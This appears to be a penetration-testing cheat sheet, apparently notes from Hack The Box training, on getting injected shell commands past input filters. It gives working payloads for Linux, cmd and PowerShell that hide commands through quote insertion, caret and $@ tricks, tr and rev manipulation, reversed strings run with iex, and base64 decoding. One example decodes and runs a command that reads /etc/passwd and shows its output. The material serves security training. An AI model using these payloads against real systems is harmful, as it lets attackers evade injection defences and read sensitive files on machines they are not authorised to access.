
[External Source for Techniques not covered](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

### Using Obfuscation For Filter Bypass

Obfuscating letters since shell don't recognize (E.g single quotes) [powershell and linux]
```shell-session
w'h'o'am'i
```
(E.g double quotes) [powershell and linux]
```shell-session
w"h"o"am"i
```
using positional character [linux only] 
```bash
who$@ami
```
using positional character [windows cmd]
```cmd-session
who^ami
```
### String Manipulation For Filter Bypass

forcing characters to lowercase (ends up being "whoami" ) [linux]
```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

reversing character order [linux]
```shell-session
$(rev<<<'imaohw')
```

reversing character order [powershell]
```powershell-session
"whoami"[-1..-20] -join ''
```

reverse with iex subshell [powershell]
```powershell-session
iex "$('imaohw'[-1..-20] -join '')"
```

### String Encoding for Filter Bypass

Powershell base64 encoding [powershell]
```powershell-session
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```


Using base64 decoding and reverse pipes to bypass pipe filters [Linux]
```shell-session
Auzzie@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==


Auzzie@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

```
**Note: Can be done with hex decoding command " xxd" rather than base64

